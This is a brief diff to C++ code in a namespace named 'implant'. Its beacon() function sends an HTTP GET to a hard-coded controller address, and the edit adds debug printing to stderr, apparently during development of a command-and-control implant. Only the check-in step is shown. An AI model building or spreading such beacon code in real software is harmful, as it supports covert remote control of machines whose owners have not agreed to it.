@@ -9,9 +9,10 @@
 namespace implant {
 
 std::string beacon() {
-    std::string url = "http://192.168.1.147:8443/";
+    std::string url = "http://192.168.1.147:8443/home";
+    std::cerr << url << std::endl;
     std::string response = xhttp::http_get(url);
-    std::cout << response << std::endl;
+    std::cerr << response << std::endl;
     return response;
 }
 
